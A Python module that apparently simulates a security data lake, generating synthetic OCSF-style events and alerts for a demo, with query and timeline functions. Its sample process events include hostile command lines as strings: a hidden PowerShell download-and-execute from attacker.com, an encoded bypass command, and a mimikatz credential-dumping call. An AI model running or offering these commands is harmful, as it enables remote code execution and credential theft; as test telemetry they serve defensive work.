"""
Normalized Data Lake Service
Simulates a unified security data lake with OCSF-normalized events
"""

import random
import uuid
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional
from app.models.ocsf_models import (
    OCSFSecurityEvent, AlertEvent, SeverityLevel, ActivityType,
    DispositionType, Actor, Device, NetworkEndpoint, NetworkConnection,
    FileInfo, ProcessInfo, ThreatIndicator, MitreAttack
)
from app.models.chat_models import DataLakeQuery, DataLakeResponse
import logging

logger = logging.getLogger(__name__)


class NormalizedDataLake:
    """
    Simulated normalized data lake containing OCSF-formatted security events
    from multiple sources (EDR, SIEM, Firewall, IDS, etc.)
    """
    
    def __init__(self):
        self.events: List[Dict[str, Any]] = []
        self.alerts: List[Dict[str, Any]] = []
        self._generate_synthetic_data()
    
    def _generate_synthetic_data(self):
        """Generate synthetic security events for demonstration"""
        
        # Sample data pools
        usernames = ["jsmith", "admin", "svc_backup", "root", "SYSTEM", "agarcia", "mwilson", "threat_actor_x"]
        hostnames = ["WKS-001", "WKS-002", "SRV-DC01", "SRV-WEB01", "SRV-DB01", "WKS-EXEC01", "SRV-MAIL01"]
        ips_internal = ["10.0.1.50", "10.0.1.51", "10.0.2.10", "10.0.2.20", "10.0.3.100", "192.168.1.100"]
        ips_external = ["185.220.101.1", "91.121.87.10", "45.33.32.156", "198.51.100.10", "203.0.113.50"]
        malicious_ips = ["185.220.101.1", "91.121.87.10", "45.155.205.233", "23.129.64.100"]
        malicious_domains = ["malware-c2.evil.com", "exfil.badactor.net", "cryptominer.xyz", "phishing-login.com"]
        processes = ["powershell.exe", "cmd.exe", "python.exe", "chrome.exe", "outlook.exe", "svchost.exe", "mimikatz.exe"]
        malicious_hashes = [
            "a1b2c3d4e5f6789012345678901234567890abcd",
            "deadbeef12345678901234567890123456789012",
            "cafe1234567890abcdef1234567890abcdef1234"
        ]
        
        sources = ["crowdstrike", "splunk", "palo_alto", "microsoft_defender", "sentinel_one", "carbon_black"]
        
        # Generate events over the past 7 days
        now = datetime.utcnow()
        
        # Normal authentication events
        for i in range(500):
            event_time = now - timedelta(hours=random.randint(0, 168))
            self.events.append({
                "event_id": str(uuid.uuid4()),
                "event_time": event_time.isoformat(),
                "event_type": "authentication",
                "activity_type": random.choice(["login", "logout"]),
                "severity": "informational",
                "confidence": 0.95,
                "disposition": "allowed",
                "source": random.choice(sources),
                "source_type": "siem",
                "actor": {
                    "user_name": random.choice(usernames[:6]),
                    "user_id": f"U{random.randint(1000, 9999)}"
                },
                "device": {
                    "hostname": random.choice(hostnames),
                    "ip": random.choice(ips_internal),
                    "os_name": random.choice(["Windows 10", "Windows 11", "Windows Server 2019"])
                },
                "message": f"User authentication event",
                "tags": ["authentication", "normal"]
            })
        
        # Network connection events
        for i in range(300):
            event_time = now - timedelta(hours=random.randint(0, 168))
            is_suspicious = random.random() < 0.15
            dst_ip = random.choice(malicious_ips if is_suspicious else ips_external)
            
            self.events.append({
                "event_id": str(uuid.uuid4()),
                "event_time": event_time.isoformat(),
                "event_type": "network_activity",
                "activity_type": "network",
                "severity": "high" if is_suspicious else "low",
                "confidence": 0.85 if is_suspicious else 0.95,
                "disposition": "blocked" if is_suspicious and random.random() > 0.3 else "allowed",
                "source": random.choice(sources),
                "source_type": "firewall",
                "device": {
                    "hostname": random.choice(hostnames),
                    "ip": random.choice(ips_internal)
                },
                "network": {
                    "src": {"ip": random.choice(ips_internal), "port": random.randint(49152, 65535)},
                    "dst": {"ip": dst_ip, "port": random.choice([80, 443, 445, 3389, 22, 4444, 8080])},
                    "protocol": random.choice(["TCP", "UDP"]),
                    "direction": "outbound",
                    "bytes_out": random.randint(100, 1000000)
                },
                "threat_indicators": [{"type": "ip", "value": dst_ip, "confidence": 0.9}] if is_suspicious else [],
                "message": f"Outbound connection to {'known malicious' if is_suspicious else 'external'} IP",
                "tags": ["network", "suspicious" if is_suspicious else "normal"]
            })
        
        # Process execution events
        for i in range(400):
            event_time = now - timedelta(hours=random.randint(0, 168))
            proc = random.choice(processes)
            is_suspicious = proc in ["mimikatz.exe", "powershell.exe"] and random.random() < 0.3
            
            cmd_lines = {
                "powershell.exe": [
                    "powershell.exe -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                    "powershell.exe Get-Process",
                    "powershell.exe -Command \"Get-EventLog -LogName Security\"",
                    "powershell.exe -nop -w hidden -c IEX(wget attacker.com/shell.ps1)"
                ],
                "mimikatz.exe": ["mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\""],
                "cmd.exe": ["cmd.exe /c whoami", "cmd.exe /c net user", "cmd.exe /c ipconfig /all"]
            }
            
            self.events.append({
                "event_id": str(uuid.uuid4()),
                "event_time": event_time.isoformat(),
                "event_type": "process_activity",
                "activity_type": "process",
                "severity": "critical" if proc == "mimikatz.exe" else ("high" if is_suspicious else "low"),
                "confidence": 0.95,
                "disposition": "allowed",
                "source": random.choice(["crowdstrike", "microsoft_defender", "carbon_black"]),
                "source_type": "edr",
                "actor": {
                    "user_name": random.choice(usernames),
                    "process_name": proc
                },
                "device": {
                    "hostname": random.choice(hostnames),
                    "ip": random.choice(ips_internal)
                },
                "process": {
                    "name": proc,
                    "pid": random.randint(1000, 65000),
                    "cmd_line": random.choice(cmd_lines.get(proc, [f"{proc}"])),
                    "path": f"C:\\Windows\\System32\\{proc}" if proc != "mimikatz.exe" else "C:\\Temp\\mimikatz.exe"
                },
                "parent_process": {
                    "name": random.choice(["explorer.exe", "cmd.exe", "services.exe"]),
                    "pid": random.randint(100, 1000)
                },
                "mitre_attack": [
                    {"technique_id": "T1059.001", "technique_name": "PowerShell", "tactic_name": "Execution"}
                ] if "powershell" in proc.lower() else [],
                "message": f"Process execution: {proc}",
                "tags": ["process", "execution", "suspicious" if is_suspicious else "normal"]
            })
        
        # File events
        for i in range(200):
            event_time = now - timedelta(hours=random.randint(0, 168))
            is_malicious = random.random() < 0.1
            
            self.events.append({
                "event_id": str(uuid.uuid4()),
                "event_time": event_time.isoformat(),
                "event_type": "file_activity",
                "activity_type": random.choice(["create", "read", "update", "delete"]),
                "severity": "critical" if is_malicious else "informational",
                "confidence": 0.9,
                "disposition": "quarantined" if is_malicious else "allowed",
                "source": random.choice(["crowdstrike", "microsoft_defender"]),
                "source_type": "edr",
                "device": {
                    "hostname": random.choice(hostnames),
                    "ip": random.choice(ips_internal)
                },
                "file": {
                    "name": f"{'malware_' if is_malicious else 'document_'}{random.randint(1,100)}.{'exe' if is_malicious else 'docx'}",
                    "path": "C\\Temp\\" if is_malicious else "C\\Users\\Documents\\",
                    "hash_sha256": random.choice(malicious_hashes) if is_malicious else f"{uuid.uuid4().hex}",
                    "size": random.randint(1024, 10485760)
                },
                "threat_indicators": [
                    {"type": "hash", "value": random.choice(malicious_hashes), "confidence": 0.95, "threat_type": "malware"}
                ] if is_malicious else [],
                "message": f"File {'quarantined - malware detected' if is_malicious else 'access'}",
                "tags": ["file", "malware" if is_malicious else "normal"]
            })
        
        # DNS events
        for i in range(250):
            event_time = now - timedelta(hours=random.randint(0, 168))
            is_malicious = random.random() < 0.08
            domain = random.choice(malicious_domains) if is_malicious else f"{'www.' if random.random() > 0.5 else ''}{random.choice(['google', 'microsoft', 'github', 'aws'])}.com"
            
            self.events.append({
                "event_id": str(uuid.uuid4()),
                "event_time": event_time.isoformat(),
                "event_type": "dns_query",
                "activity_type": "dns",
                "severity": "high" if is_malicious else "informational",
                "confidence": 0.88,
                "disposition": "blocked" if is_malicious else "allowed",
                "source": random.choice(["palo_alto", "cisco_umbrella"]),
                "source_type": "dns_security",
                "device": {
                    "hostname": random.choice(hostnames),
                    "ip": random.choice(ips_internal)
                },
                "network": {
                    "dst": {"hostname": domain}
                },
                "threat_indicators": [
                    {"type": "domain", "value": domain, "confidence": 0.92, "threat_type": "c2"}
                ] if is_malicious else [],
                "message": f"DNS query for {domain}",
                "tags": ["dns", "c2" if is_malicious else "normal"]
            })
        
        # Generate alerts from suspicious events
        alert_id = 1
        for event in self.events:
            if event.get("severity") in ["high", "critical"]:
                self.alerts.append({
                    "alert_id": f"ALR-{alert_id:05d}",
                    "alert_name": self._generate_alert_name(event),
                    "alert_description": event.get("message", "Security alert triggered"),
                    "severity": event["severity"],
                    "status": random.choice(["open", "investigating", "resolved"]),
                    "created_at": event["event_time"],
                    "event_id": event["event_id"],
                    "device": event.get("device", {}),
                    "actor": event.get("actor", {}),
                    "mitre_attack": event.get("mitre_attack", []),
                    "threat_indicators": event.get("threat_indicators", [])
                })
                alert_id += 1
        
        logger.info(f"Generated {len(self.events)} events and {len(self.alerts)} alerts")
    
    def _generate_alert_name(self, event: Dict) -> str:
        """Generate descriptive alert name based on event"""
        event_type = event.get("event_type", "unknown")
        severity = event.get("severity", "unknown")
        
        alert_names = {
            "network_activity": ["Suspicious Outbound Connection", "Potential C2 Communication", "Data Exfiltration Attempt"],
            "process_activity": ["Suspicious Process Execution", "Credential Dumping Detected", "Malicious PowerShell Activity"],
            "file_activity": ["Malware Detected", "Suspicious File Creation", "Ransomware Behavior"],
            "dns_query": ["Malicious Domain Query", "C2 Domain Communication", "DNS Tunneling Detected"],
            "authentication": ["Brute Force Attempt", "Impossible Travel", "Suspicious Login"]
        }
        
        return random.choice(alert_names.get(event_type, ["Security Alert"]))
    
    def query(self, query: DataLakeQuery) -> DataLakeResponse:
        """Execute a query against the data lake"""
        import time
        start_time = time.time()
        
        results = self.events.copy()
        
        # Apply filters
        if query.filters:
            results = self._apply_filters(results, query.filters)
        
        # Apply time range
        if query.time_range:
            results = self._apply_time_range(results, query.time_range)
        
        # Sort
        if query.sort_by:
            reverse = query.sort_order == "desc"
            results = sorted(results, key=lambda x: x.get(query.sort_by, ""), reverse=reverse)
        
        # Get total before limiting
        total_hits = len(results)
        
        # Apply limit
        results = results[:query.limit]
        
        # Calculate aggregations
        aggregations = {}
        if query.aggregations:
            aggregations = self._calculate_aggregations(self.events, query.aggregations, query.filters)
        
        query_time = int((time.time() - start_time) * 1000)
        
        return DataLakeResponse(
            query_id=query.query_id,
            total_hits=total_hits,
            events=results,
            aggregations=aggregations,
            query_time_ms=query_time
        )
    
    def _apply_filters(self, events: List[Dict], filters: Dict[str, Any]) -> List[Dict]:
        """Apply filters to events"""
        filtered = events
        
        for key, value in filters.items():
            if key == "severity":
                if isinstance(value, list):
                    filtered = [e for e in filtered if e.get("severity") in value]
                else:
                    filtered = [e for e in filtered if e.get("severity") == value]
            elif key == "event_type":
                if isinstance(value, list):
                    filtered = [e for e in filtered if e.get("event_type") in value]
                else:
                    filtered = [e for e in filtered if e.get("event_type") == value]
            elif key == "source":
                filtered = [e for e in filtered if e.get("source") == value]
            elif key == "hostname":
                filtered = [e for e in filtered if e.get("device", {}).get("hostname") == value]
            elif key == "ip":
                filtered = [e for e in filtered if 
                           e.get("device", {}).get("ip") == value or
                           e.get("network", {}).get("src", {}).get("ip") == value or
                           e.get("network", {}).get("dst", {}).get("ip") == value]
            elif key == "user":
                filtered = [e for e in filtered if e.get("actor", {}).get("user_name") == value]
            elif key == "tags":
                if isinstance(value, list):
                    filtered = [e for e in filtered if any(t in e.get("tags", []) for t in value)]
                else:
                    filtered = [e for e in filtered if value in e.get("tags", [])]
            elif key == "has_threat_indicators":
                filtered = [e for e in filtered if len(e.get("threat_indicators", [])) > 0]
            elif key == "search":
                # Full text search
                value_lower = value.lower()
                filtered = [e for e in filtered if 
                           value_lower in str(e).lower()]
        
        return filtered
    
    def _apply_time_range(self, events: List[Dict], time_range: Dict) -> List[Dict]:
        """Apply time range filter"""
        start = time_range.get("start")
        end = time_range.get("end")
        
        filtered = []
        for event in events:
            event_time = datetime.fromisoformat(event["event_time"].replace("Z", "+00:00"))
            if start and event_time < start:
                continue
            if end and event_time > end:
                continue
            filtered.append(event)
        
        return filtered
    
    def _calculate_aggregations(self, events: List[Dict], agg_fields: List[str], filters: Dict = None) -> Dict:
        """Calculate aggregations"""
        if filters:
            events = self._apply_filters(events, filters)
        
        aggregations = {}
        
        for field in agg_fields:
            counts = {}
            for event in events:
                if field == "severity":
                    value = event.get("severity", "unknown")
                elif field == "event_type":
                    value = event.get("event_type", "unknown")
                elif field == "source":
                    value = event.get("source", "unknown")
                elif field == "hostname":
                    value = event.get("device", {}).get("hostname", "unknown")
                elif field == "disposition":
                    value = event.get("disposition", "unknown")
                else:
                    value = str(event.get(field, "unknown"))
                
                counts[value] = counts.get(value, 0) + 1
            
            # Sort by count descending
            sorted_counts = sorted(counts.items(), key=lambda x: x[1], reverse=True)
            aggregations[field] = [{"key": k, "count": v} for k, v in sorted_counts[:10]]
        
        return aggregations
    
    def get_alerts(self, status: Optional[str] = None, severity: Optional[str] = None, limit: int = 50) -> List[Dict]:
        """Get alerts with optional filters"""
        alerts = self.alerts.copy()
        
        if status:
            alerts = [a for a in alerts if a.get("status") == status]
        if severity:
            alerts = [a for a in alerts if a.get("severity") == severity]
        
        return alerts[:limit]
    
    def get_event_by_id(self, event_id: str) -> Optional[Dict]:
        """Get a specific event by ID"""
        for event in self.events:
            if event.get("event_id") == event_id:
                return event
        return None
    
    def get_timeline(self, entity_type: str, entity_value: str, hours: int = 24) -> List[Dict]:
        """Get timeline of events for a specific entity"""
        cutoff = datetime.utcnow() - timedelta(hours=hours)
        
        timeline = []
        for event in self.events:
            event_time = datetime.fromisoformat(event["event_time"].replace("Z", "+00:00"))
            if event_time < cutoff:
                continue
            
            match = False
            if entity_type == "ip":
                if (event.get("device", {}).get("ip") == entity_value or
                    event.get("network", {}).get("src", {}).get("ip") == entity_value or
                    event.get("network", {}).get("dst", {}).get("ip") == entity_value):
                    match = True
            elif entity_type == "hostname":
                if event.get("device", {}).get("hostname") == entity_value:
                    match = True
            elif entity_type == "user":
                if event.get("actor", {}).get("user_name") == entity_value:
                    match = True
            
            if match:
                timeline.append(event)
        
        # Sort by time
        timeline.sort(key=lambda x: x["event_time"], reverse=True)
        return timeline
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get data lake statistics"""
        now = datetime.utcnow()
        last_24h = now - timedelta(hours=24)
        
        events_24h = [e for e in self.events 
                     if datetime.fromisoformat(e["event_time"].replace("Z", "+00:00")) > last_24h]
        
        return {
            "total_events": len(self.events),
            "total_alerts": len(self.alerts),
            "events_last_24h": len(events_24h),
            "open_alerts": len([a for a in self.alerts if a.get("status") == "open"]),
            "critical_alerts": len([a for a in self.alerts if a.get("severity") == "critical"]),
            "high_alerts": len([a for a in self.alerts if a.get("severity") == "high"]),
            "sources": list(set(e.get("source") for e in self.events)),
            "event_types": list(set(e.get("event_type") for e in self.events))
        }


# Singleton instance
data_lake = NormalizedDataLake()
